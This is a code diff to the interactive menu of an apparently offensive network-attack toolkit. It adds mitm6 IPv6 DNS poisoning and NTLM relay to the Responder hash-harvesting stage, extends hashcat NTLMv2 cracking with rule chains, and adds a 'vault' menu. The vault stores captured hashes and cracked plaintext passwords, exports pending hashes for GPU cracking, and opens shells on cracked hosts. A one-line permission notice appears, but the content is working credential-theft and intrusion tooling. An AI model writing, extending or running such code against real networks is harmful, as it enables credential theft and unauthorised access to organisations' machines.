@@ -7,7 +7,7 @@ Only run against networks you own or have explicit written permission to test.
 import os, sys, shutil, subprocess, time
 
 from . import tui, iface
-from . import recon, harvest, spray, crack, lateral, shells
+from . import recon, harvest, spray, crack, lateral, shells, vault
 
 
 # ── session state ─────────────────────────────────────────────────────────────
@@ -161,8 +161,8 @@ def run_stage2(state: State) -> bool:
     decision = _confirm(
         "STAGE 2 — HASH HARVEST",
         f"Responder poisons LLMNR/NBT-NS on {state.interface} for {state.harvest_time}s.\n"
-        f"  Windows machines hand over NTLMv2 hashes automatically.",
-        "MEDIUM — poisoning LLMNR/NBT-NS, visible in Wireshark",
+        f"  Relay mode also runs mitm6 (IPv6 DNS poisoning) to force auth without user interaction.",
+        "MEDIUM — poisoning LLMNR/NBT-NS/DHCPv6, visible in Wireshark",
         state
     )
     if decision == "stop": return False
@@ -182,8 +182,8 @@ def run_stage2(state: State) -> bool:
         print()
         print(f"  {tui.WH}How do you want to harvest credentials?{tui.R}")
         print(f"  {tui.RED}{tui.B}1{tui.R}  Passive only  — Responder captures hashes, crack later")
-        print(f"  {tui.RED}{tui.B}2{tui.R}  Relay attack  — relay auth to targets in real-time (no cracking needed)")
-        print(f"  {tui.RED}{tui.B}3{tui.R}  Both          — relay first, fall back to passive")
+        print(f"  {tui.RED}{tui.B}2{tui.R}  Relay + mitm6 — IPv6 DNS poison + relay auth in real-time (no cracking needed)")
+        print(f"  {tui.RED}{tui.B}3{tui.R}  Both          — relay+mitm6 first, fall back to passive hash capture")
         print()
         choice = input(f"  {tui.WH}{tui.B}→ {tui.R}").strip()
     else:
@@ -253,8 +253,8 @@ def run_stage4(state: State) -> bool:
 
     decision = _confirm(
         "STAGE 4 — HASH CRACKING",
-        f"hashcat NTLMv2 (mode 5600) against rockyou.txt.\n"
-        f"  {len(state.hashes)} hash(es) queued.",
+        f"hashcat NTLMv2 (mode 5600): plain dictionary → best64 rules → d3ad0ne → dive.\n"
+        f"  {len(state.hashes)} hash(es) queued. Stops as soon as all hashes crack.",
         "LOW — local CPU/GPU, no network traffic",
         state
     )
@@ -276,12 +276,19 @@ def run_stage4(state: State) -> bool:
             lines.append(line)
         state.hashes = lines
 
-    cracked = crack.crack_ntlmv2(state.hashes, wordlist=state.wordlist)
+    # Quick CPU attempt — saves everything to vault; uncracked marked pending for GPU
+    target_ip = state.target_host or "unknown"
+    cracked = crack.crack_ntlmv2_quick(state.hashes, target_ip=target_ip)
     state.cracked = cracked
+
+    pending = vault.pending_hashes()
     if cracked:
         tui.success(f"Cracked {len(cracked)} hash(es)")
-    else:
-        tui.warn("No hashes cracked")
+    if pending:
+        tui.warn(f"{len(pending)} hash(es) unsolved — export to CascadeCracker for GPU cracking")
+        tui.info("  Vault → Export hashes  (menu option v)")
+    if not cracked and not pending:
+        tui.warn("No hashes to crack")
     return True
 
 
@@ -690,6 +697,92 @@ def _print_about():
     input(f"  {tui.DIM}[ press Enter to go back ]{tui.R}")
 
 
+# ── vault menu ────────────────────────────────────────────────────────────────
+
+def vault_menu(state: State):
+    """Browse captured hashes, cracked passwords, export for GPU cracking."""
+    while True:
+        tui.clear()
+        tui.print_banner()
+        tui.phase("VAULT")
+
+        vc = vault.cracked_entries()
+        vp = vault.pending_hashes()
+        va = vault.all_entries()
+
+        print(f"  {tui.GRN}{tui.B}{len(vc)} cracked{tui.R}    "
+              f"{tui.YLW}{len(vp)} pending GPU{tui.R}    "
+              f"{tui.DIM}{len(va)} total{tui.R}")
+        print()
+        tui.divider()
+        print(f"  {tui.RED}{tui.B}1{tui.R}  View all hashes          "
+              f"{tui.DIM}captured NTLMv2/NTLM hashes with status{tui.R}")
+        print(f"  {tui.RED}{tui.B}2{tui.R}  View cracked passwords   "
+              f"{tui.DIM}all plaintext credentials recovered{tui.R}")
+        print(f"  {tui.RED}{tui.B}3{tui.R}  Export pending hashes    "
+              f"{tui.DIM}write hash file for CascadeCracker (GPU){tui.R}")
+        print(f"  {tui.RED}{tui.B}4{tui.R}  Import cracked results   "
+              f"{tui.DIM}load potfile back from CascadeCracker{tui.R}")
+        print(f"  {tui.RED}{tui.B}5{tui.R}  Shell from vault         "
+              f"{tui.DIM}connect to any cracked host right now{tui.R}")
+        tui.divider()
+        print(f"\n  {tui.DIM}   0 / Enter → back{tui.R}\n")
+
+        raw = input(f"  {tui.WH}{tui.B}vault → {tui.R}").strip().lower()
+
+        if raw in ("0", ""):
+            return
+
+        elif raw == "1":
+            tui.clear(); tui.print_banner(); tui.phase("ALL HASHES")
+            vault.print_hashes()
+            input(f"  {tui.DIM}[ press Enter ]{tui.R}")
+
+        elif raw == "2":
+            tui.clear(); tui.print_banner(); tui.phase("CRACKED PASSWORDS")
+            vault.print_cracked()
+            input(f"  {tui.DIM}[ press Enter ]{tui.R}")
+
+        elif raw == "3":
+            if not vp:
+                tui.warn("No pending hashes to export.")
+                time.sleep(1)
+                continue
+            from . import vault as _v
+            out = _v.export_hash_file()
+            tui.success(f"Exported {len(vp)} hash(es) to: {tui.WH}{out}{tui.R}")
+            tui.info("Copy this file to your Windows machine and run CascadeCracker.")
+            tui.info(f"  scp {out} user@windowspc:~/")
+            input(f"\n  {tui.DIM}[ press Enter ]{tui.R}")
+
+        elif raw == "4":
+            pot = input(f"  {tui.WH}Path to potfile / cracked output: {tui.R}").strip()
+            if not pot:
+                continue
+            n = vault.import_cracked_file(pot)
+            if n:
+                tui.success(f"Updated {n} vault entry(s) from {pot}")
+            else:
+                tui.warn("No matches found in that file.")
+            time.sleep(1)
+
+        elif raw == "5":
+            cracked = vault.cracked_entries()
+            if not cracked:
+                tui.warn("No cracked credentials in vault yet.")
+                time.sleep(1)
+                continue
+            # Build compromised list from vault entries + known hosts
+            entries = []
+            host_map = {h["ip"]: h for h in state.hosts}
+            for e in cracked:
+                ip   = e["target_ip"]
+                host = host_map.get(ip, {"ip": ip, "hostname": "", "ports": [22, 445, 5985]})
+                cred = {"user": e["username"], "secret": e["password"]}
+                entries.append({"host": host, "cred": cred})
+            shells.access_menu(entries)
+
+
 # ── main menu ─────────────────────────────────────────────────────────────────
 
 def _warn_missing(state: State):
@@ -740,6 +833,11 @@ def main_menu(state: State):
               f"{len(state.compromised)} available{tui.R}")
         print(f"  {tui.RED}{tui.B} 8{tui.R}  {tui.WH}Saved sessions{tui.R}"
               f" {tui.DIM}reconnect to previously compromised hosts{tui.R}")
+        print()
+        _vc = len(vault.cracked_entries())
+        _vp = len(vault.pending_hashes())
+        print(f"  {tui.RED}{tui.B} v{tui.R}  {tui.WH}Vault — hashes & cracked creds{tui.R}"
+              f"  {tui.DIM}{_vc} cracked  {_vp} pending{tui.R}")
         print()
         print(f"  {tui.DIM}   s  Setup          f  Free commands (bash)   "
               f"h  Help / about   q  Quit{tui.R}")
@@ -807,6 +905,9 @@ def main_menu(state: State):
 
         elif raw == "8":
             shells.saved_menu()
+
+        elif raw == "v":
+            vault_menu(state)
 
         elif raw == "s":
             setup_menu(state)
